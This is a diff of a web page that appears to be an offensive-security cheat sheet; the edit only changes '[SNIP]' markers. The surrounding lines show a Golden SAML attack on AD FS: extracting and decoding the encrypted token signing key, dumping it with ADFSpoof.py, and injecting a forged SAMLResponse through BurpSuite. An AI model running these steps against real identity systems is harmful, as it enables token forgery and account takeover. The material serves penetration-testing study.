@@ -195,7 +195,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Reading Encrypted Signing Key from Database</span>
 </span></span><span class="line"><span class="cl"><span class="go">[-] Encrypted Token Signing Key Begin
-</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAQAAAA ...[SNIP]... EsNEUSTXxm
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAQAAAA ---[SNIP]--- EsNEUSTXxm
 </span></span></span><span class="line"><span class="cl"><span class="go">[-] Encrypted Token Signing Key End
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
@@ -248,7 +248,7 @@ TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/A
 </span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
 </span></span><span class="line"><span class="cl"><span class="go">echo -n '<span class="o editable-keyword">&lt;B64_ENCRYPTED_TOKEN&gt;</span>' | base64 -d &gt; EncryptedPfx.bin
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -n <span class="s1">'AAAAAQAAAA ...[SNIP]... EsNEUSTXxm'</span> <span class="p">|</span> base64 -d &gt; EncryptedPfx.bin
+<span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -n <span class="s1">'AAAAAQAAAA ---[SNIP]--- EsNEUSTXxm'</span> <span class="p">|</span> base64 -d &gt; EncryptedPfx.bin
 </span></span></div></pre></div><h4 id="3-check-which-private-key-is-correct">3. Check which private key is correct</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> The correct key will not show error
 </span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
@@ -279,7 +279,7 @@ TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/A
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">A tool to for AD FS security tokens
 </span></span></span><span class="line"><span class="cl"><span class="go">Created by @doughsec
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PHNhbWxwOl ---[SNIP]--- c3BvbnNlPg%3D%3D
 </span></span></span></div></pre></div><h4 id="5-modify-request-in-burpsuite">5. Modify request in BurpSuite</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+-------------------------------------------------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| 1. Enable Intercept in Proxy Tab                            |
@@ -306,7 +306,7 @@ TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/A
 </span></span></span><span class="line"><span class="cl"><span class="go">Te: trailers
 </span></span></span><span class="line"><span class="cl"><span class="go">Connection: close
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SAMLResponse=PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SAMLResponse=PHNhbWxwOl ---[SNIP]--- c3BvbnNlPg%3D%3D
 </span></span></span></div></pre></div></div></div><p></p>
 
 </div>
